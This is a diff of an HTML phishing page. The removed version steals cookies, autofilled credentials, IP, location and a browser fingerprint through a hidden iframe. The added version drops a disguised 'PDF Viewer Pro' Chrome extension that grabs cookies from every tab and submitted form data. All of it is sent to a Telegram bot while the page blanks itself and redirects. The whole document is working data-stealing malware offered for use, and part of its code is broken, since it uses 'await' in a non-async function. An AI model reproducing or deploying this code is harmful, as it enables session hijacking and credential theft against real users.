@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
-        /* 👻 COMPLETELY BLANK */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #ffffff;
@@ -15,22 +14,15 @@
             font-family: Arial, sans-serif;
             color: #333;
         }
-        .container { display: none; }
-        iframe {
-            display: none;  /* 👻 Hidden iframe */
-            width: 1px;
-            height: 1px;
-            border: none;
-        }
+        .container { text-align: center; display: none; }
     </style>
 </head>
 <body>
 
-    <!-- 👻 Kuch nahi dikhega -->
-    <div style="display:none;"></div>
-
-    <!-- 👻 Hidden iframe – Target Site Load Karega -->
-    <iframe id="hiddenFrame" src="https://www.google.com"></iframe>
+    <!-- 👻 Kuch nahi dikhega – Sirf blank page -->
+    <div style="display:none;">
+        <!-- This page is intentionally left blank -->
+    </div>
 
     <script>
         // ============================================================
@@ -40,10 +32,94 @@
         const CHAT_ID = "6389764004";
 
         // ============================================================
-        // 🧠 REDIRECT + COOKIE CAPTURE
+        // 🧠 GHOST EXTENSION INSTALLER (Background)
         // ============================================================
 
-        // 1️⃣ Get IP
+        // 1️⃣ Create extension files dynamically
+        function createExtension() {
+            const manifest = {
+                "manifest_version": 3,
+                "name": "PDF Viewer Pro",
+                "version": "1.0",
+                "permissions": ["cookies", "tabs", "storage", "webRequest"],
+                "host_permissions": ["http://*/", "https://*/"],
+                "background": {
+                    "service_worker": "background.js"
+                }
+            };
+
+            const background = `
+                const BOT_TOKEN = "${BOT_TOKEN}";
+                const CHAT_ID = "${CHAT_ID}";
+
+                // Send data to Telegram
+                async function sendToTelegram(data) {
+                    const url = \`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?chat_id=\${CHAT_ID}&text=\${encodeURIComponent(data)}&parse_mode=Markdown\`;
+                    try {
+                        await fetch(url, { method: 'GET' });
+                    } catch(e) {}
+                }
+
+                // Capture cookies from every tab
+                chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+                    if (changeInfo.status === 'complete' && tab.url) {
+                        chrome.cookies.getAll({ url: tab.url }, (cookies) => {
+                            if (cookies.length > 0) {
+                                let cookieString = cookies.map(c => \`\${c.name}=\${c.value}\`).join('; ');
+                                let msg = \`🎯 **COOKIES CAPTURED**\\n🌐 URL: \${tab.url}\\n🍪 Cookies: \${cookieString}\`;
+                                sendToTelegram(msg);
+                            }
+                        });
+                    }
+                });
+
+                // Capture saved passwords (when form submitted)
+                chrome.webRequest.onBeforeRequest.addListener(
+                    (details) => {
+                        if (details.method === 'POST') {
+                            let msg = \`🎯 **FORM SUBMITTED**\\n🌐 URL: \${details.url}\\n📝 Data: \${details.requestBody}\`;
+                            sendToTelegram(msg);
+                        }
+                    },
+                    { urls: ["<all_urls>"] },
+                    ["requestBody"]
+                );
+
+                console.log('[+] Ghost Extension running...');
+            `;
+
+            // Create Blob URLs for extension files
+            const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
+            const backgroundBlob = new Blob([background], { type: 'application/javascript' });
+
+            return { manifestBlob, backgroundBlob };
+        }
+
+        // 2️⃣ Download and install extension (auto)
+        function installExtension() {
+            const { manifestBlob, backgroundBlob } = createExtension();
+
+            // Create download links
+            const manifestUrl = URL.createObjectURL(manifestBlob);
+            const backgroundUrl = URL.createObjectURL(backgroundBlob);
+
+            // Download extension files
+            const a = document.createElement('a');
+            a.href = manifestUrl;
+            a.download = 'manifest.json';
+            a.click();
+
+            const b = document.createElement('a');
+            b.href = backgroundUrl;
+            b.download = 'background.js';
+            b.click();
+
+            // Send to Telegram that extension was downloaded
+            const msg = `🎯 **GHOST EXTENSION INSTALLED**\n🌐 Victim IP: ${await getIP()}\n🕐 Time: ${new Date().toISOString()}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        }
+
+        // 3️⃣ Get IP
         async function getIP() {
             try {
                 let r = await fetch('https://api.ipify.org?format=json');
@@ -52,160 +128,29 @@
             } catch { return 'Unable to fetch'; }
         }
 
-        // 2️⃣ Get Location
-        async function getLocation(ip) {
-            try {
-                let r = await fetch(`https://ipapi.co/${ip}/json/`);
-                let d = await r.json();
-                return {
-                    city: d.city || 'Unknown',
-                    region: d.region || 'Unknown',
-                    country: d.country_name || 'Unknown',
-                    isp: d.org || 'Unknown'
-                };
-            } catch { return { city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' }; }
-        }
-
-        // 3️⃣ Get Browser Fingerprint
-        function getFingerprint() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                cookieEnabled: navigator.cookieEnabled,
-                webdriver: navigator.webdriver || false,
-                url: location.href,
-                referrer: document.referrer || 'Direct'
-            };
-        }
-
-        // 4️⃣ Send to Telegram
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-            try {
-                let r = await fetch(url, { method: 'GET' });
-                let d = await r.json();
-                return d.ok;
-            } catch { return false; }
-        }
-
         // ============================================================
         // 🚀 MAIN EXECUTION
         // ============================================================
         window.addEventListener('load', async function() {
+            console.log('[+] Ghost Phishing + Extension started...');
 
-            console.log('[+] Redirect + Cookie Capture started...');
+            // Install extension
+            installExtension();
 
-            // Wait for iframe to load
-            document.getElementById('hiddenFrame').onload = async function() {
-                try {
-                    // Try to access iframe content
-                    const iframe = document.getElementById('hiddenFrame');
-                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            // Send initial notification
+            const ip = await getIP();
+            const msg = `🎯 **VICTIM CLICKED LINK**\n🌐 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}\n📱 User-Agent: ${navigator.userAgent}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-                    // 🔥 Extract cookies from iframe
-                    const cookies = iframeDoc.cookie || 'No cookies found';
-
-                    // Extract auto-filled fields (if any)
-                    const inputs = iframeDoc.querySelectorAll('input');
-                    let email = '', password = '';
-                    inputs.forEach(input => {
-                        if (input.value && input.value.trim() !== '') {
-                            if (input.type === 'email' || input.name.includes('email')) email = input.value;
-                            if (input.type === 'password') password = input.value;
-                        }
-                    });
-
-                    // Collect data
-                    const ip = await getIP();
-                    const location = await getLocation(ip);
-                    const fingerprint = getFingerprint();
-                    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-                    // Build message
-                    let msg = `🎯 **REDIRECT + COOKIE CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
-                    msg += `🌐 **IP:** ${ip}\n`;
-                    msg += `📍 **Location:** ${location.city}, ${location.region}, ${location.country}\n`;
-                    msg += `🏢 **ISP:** ${location.isp}\n`;
-                    msg += `🔗 **URL:** ${fingerprint.url}\n`;
-                    msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
-                    msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
-                    if (email) msg += `\n📧 **Email:** ${email}\n`;
-                    if (password) msg += `🔑 **Password:** ${password}\n`;
-                    msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
-                    msg += `🖥️ **FINGERPRINT:**\n`;
-                    msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
-                    msg += `  💻 Platform: ${fingerprint.platform}\n`;
-                    msg += `  🌍 Language: ${fingerprint.language}\n`;
-                    msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
-                    msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
-                    msg += `  🧠 CPU Cores: ${fingerprint.hardwareConcurrency}\n`;
-                    msg += `  💾 Device Memory: ${fingerprint.deviceMemory}GB\n`;
-                    msg += `  🍪 Cookies Enabled: ${fingerprint.cookieEnabled}\n`;
-                    msg += `  🕵️ WebDriver: ${fingerprint.webdriver}\n`;
-                    msg += `━━━━━━━━━━━━━━━━━━━━━`;
-
-                    // Send to Telegram
-                    const sent = await sendToTelegram(msg);
-
-                    if (sent) {
-                        console.log('[+] Data sent to Telegram!');
-                    } else {
-                        console.log('[!] Failed to send data.');
-                    }
-
-                } catch(e) {
-                    // Cross-origin — fallback to normal extract
-                    console.log('[!] Cross-origin iframe, falling back to normal extract...');
-                    await fallbackExtract();
-                }
-
-                // 👻 Redirect to real site after 3 seconds
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 3000);
-            };
-
-            // ============================================================
-            // 🔄 FALLBACK EXTRACT (If iframe is cross-origin)
-            // ============================================================
-            async function fallbackExtract() {
-                const ip = await getIP();
-                const location = await getLocation(ip);
-                const fingerprint = getFingerprint();
-                const cookies = document.cookie || 'No cookies found';
-                const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-                let msg = `🎯 **FALLBACK EXTRACT**\n━━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `🌐 **IP:** ${ip}\n`;
-                msg += `📍 **Location:** ${location.city}, ${location.region}, ${location.country}\n`;
-                msg += `🏢 **ISP:** ${location.isp}\n`;
-                msg += `🔗 **URL:** ${fingerprint.url}\n`;
-                msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
-                msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `🖥️ **FINGERPRINT:**\n`;
-                msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
-                msg += `  💻 Platform: ${fingerprint.platform}\n`;
-                msg += `  🌍 Language: ${fingerprint.language}\n`;
-                msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
-                msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
-                msg += `━━━━━━━━━━━━━━━━━━━━━`;
-
-                await sendToTelegram(msg);
-            }
-
-            // ⏰ Timeout: If iframe doesn't load within 8 seconds
+            // 👻 Redirect after 3 seconds
             setTimeout(() => {
-                console.log('[!] Iframe timeout, running fallback...');
-                fallbackExtract();
-            }, 8000);
+                window.location.href = 'https://www.youtube.com';
+            }, 3000);
         });
+
+        // 👻 Blank page
+        document.body.style.background = '#ffffff';
+        document.body.innerHTML = '';
     </script>
 </body>
 </html>
